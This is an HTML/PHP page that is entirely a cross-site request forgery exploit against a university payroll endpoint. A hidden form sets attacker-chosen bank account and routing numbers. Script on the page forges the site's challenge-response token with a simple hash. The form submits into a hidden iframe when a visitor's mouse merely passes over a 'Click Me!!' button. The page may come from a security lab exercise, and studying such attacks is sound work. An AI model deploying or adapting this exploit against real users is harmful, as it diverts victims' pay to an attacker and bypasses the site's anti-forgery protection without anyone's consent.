<!DOCTYPE html>
<html>
<body>
<?php
 $hy = mt_rand();
?>
<iframe frameborder="0" style="display:none" name="frame"></iframe>

      <form method="post" action="http://payroll.utexas.edu/accountfirst.php" target="frame">
      
       <input id="account" type="hidden" name="account" value="3133731337">
      
       <input id="route" type="hidden" name="routing" value="1000000001">
       <input id="csrfc" type="hidden" name="challenge" value="<?php echo $hy ?>">
       <input id="csrfr" type="hidden" name="response" value="">

     <button class="btn submit" id="myCheck" onmouseover="trial()" name="action" type="submit" value="save"><img src="images.jpeg">Click Me!!</button>
  </form>
 <script>
String.prototype.hashCode = function(){
  var hash = 1;
  for (i = 0; i < this.length; i++) {
    hash = (17237*hash + this.charCodeAt(i)) % 100000;
  }
  return hash;
}
var a = document.getElementById('account');
var r = document.getElementById('route');
function change() {
	var challenge = document.getElementById('csrfc').value;
	document.getElementById('csrfr').value = (a.value+challenge+r.value).hashCode()
}
a.onkeyup = change;
r.onkeyup = change;
change();  
function trial()
{
document.getElementById("myCheck").click();
}
</script>
</body>
</html>

